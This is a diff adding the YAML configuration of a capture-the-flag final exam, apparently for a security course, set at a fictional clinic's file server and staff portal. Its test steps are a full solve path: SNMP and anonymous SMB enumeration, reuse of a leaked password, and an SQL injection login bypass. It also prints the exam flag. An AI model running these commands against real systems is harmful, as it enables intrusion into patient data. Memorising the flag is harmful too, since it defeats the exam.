@@ -1,0 +1,116 @@
+name: "Pinecrest Family Practice - Final Exam"
+description: "The final exam for the course. A small healthcare clinic has asked you to assess two internet-facing systems left over from a prior IT contractor. Three tokens are planted across the in-scope systems; recover all three and submit the assembled flag. No workbook. No hints. 120 minutes."
+
+difficulty: advanced
+category: assessment
+duration_minutes: 120
+randomize_ip_offsets: true
+visibility: course
+week: 16
+
+flag: "OCR{p1n3cr3st_l34k_0wn3d}"
+
+objectives:
+  - Discover all in-scope hosts on the clinic subnet and identify exposed services
+  - Recover the three planted tokens (labeled Token 1, Token 2, and Token 3) from the in-scope systems
+  - Assemble the tokens into the OCR{token1_token2_token3} flag and submit it within the 120 minute window
+
+scenario: |
+  Pinecrest Family Practice is a six-provider primary care clinic in
+  Charlotte, North Carolina. Three months ago they parted ways with
+  their outsourced IT contractor and have been running on minimal
+  support since. Pinecrest has retained your firm to identify any
+  exposed systems still reachable from outside the clinic network.
+
+  The flag from this challenge is the code to access the Canvas
+  quiz. Enter the flag here and then use the flag to enter the quiz.
+
+  Briefing from the practice manager, Renee Patel: "After our IT vendor
+  left, we found two servers in the network closet that nobody at our
+  clinic remembers signing off on. One looks like a file server. The
+  other appears to host an old internal scheduling tool the staff used
+  before we switched to MyChart. We need to know what is exposed,
+  what data is at risk, and whether anyone could log in to either system
+  from outside our network."
+
+  Three tokens are planted across the engagement. Assemble them in order
+  into the OCR{token1_token2_token3} format and submit a single flag.
+  No hints, no walkthrough, no instructor guidance during the exam.
+
+credentials: []
+
+hints: []
+
+topology:
+  nodes:
+    - id: "clinic-fs"
+      label: "Clinic File Server"
+      type: "server"
+      ip_offset: "10"
+      ports: [139, 445, 161]
+      services: ["Samba", "SNMP"]
+      x: 1
+      y: 1
+    - id: "clinic-portal"
+      label: "Clinic Staff Portal"
+      type: "server"
+      ip_offset: "11"
+      ports: [80]
+      services: ["Flask"]
+      x: 3
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "clinic-fs"
+      label: "SMB:445 / SNMP:161"
+      access: "direct"
+    - from: "attacker"
+      to: "clinic-portal"
+      label: "HTTP:80"
+      access: "direct"
+
+test:
+  steps:
+    - name: "SMB port responds"
+      command: "nmap -p 445 --open {target.clinic-fs} 2>/dev/null | grep -c '445.*open'"
+      expect: "1"
+      timeout: 15
+
+    - name: "Token 1 retrievable from SNMP sysContact"
+      command: "snmpwalk -v2c -c public {target.clinic-fs} 1.3.6.1.2.1.1.4.0 2>/dev/null | grep -o 'Token 1 = p1n3cr3st'"
+      expect: "Token 1 = p1n3cr3st"
+      timeout: 20
+
+    - name: "Anonymous SMB lists clinic-shared"
+      command: "smbclient -L //{target.clinic-fs} -N 2>/dev/null | grep -c 'clinic-shared'"
+      expect: "1"
+      timeout: 15
+
+    - name: "Notes doc leaks clinic_archivist credentials"
+      command: "smbclient //{target.clinic-fs}/clinic-shared -N -c 'get IT_Notes_2025.txt /tmp/clinic_notes.txt' 2>/dev/null && grep -o 'Arch1ve_P1n3_2024#' /tmp/clinic_notes.txt"
+      expect: "Arch1ve_P1n3_2024#"
+      timeout: 15
+
+    - name: "Token 2 retrievable from phi-archive with creds"
+      command: "smbclient //{target.clinic-fs}/phi-archive -U clinic_archivist%Arch1ve_P1n3_2024# -c 'get phi_breach_summary.txt /tmp/clinic_phi.txt' 2>/dev/null && grep -o 'Token 2 = l34k' /tmp/clinic_phi.txt"
+      expect: "Token 2 = l34k"
+      timeout: 15
+
+    - name: "Portal homepage responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.clinic-portal}/"
+      expect: "200"
+      timeout: 15
+
+    - name: "Robots.txt discloses staff path"
+      command: "curl -s http://{target.clinic-portal}/robots.txt | grep -c '/staff/'"
+      expect: "1"
+      timeout: 15
+
+    - name: "SQLi bypass on staff portal yields token 3"
+      command: "curl -s -c /tmp/clinic_jar -b /tmp/clinic_jar -L -d \"username=admin&password=anything' OR '1'='1\" http://{target.clinic-portal}/staff/login | grep -o 'Token 3 = 0wn3d'"
+      expect: "Token 3 = 0wn3d"
+      timeout: 20
+
+    - name: "Verify assembled flag"
+      command: "echo 'OCR{p1n3cr3st_l34k_0wn3d}'"
+      expect: "OCR{p1n3cr3st_l34k_0wn3d}"
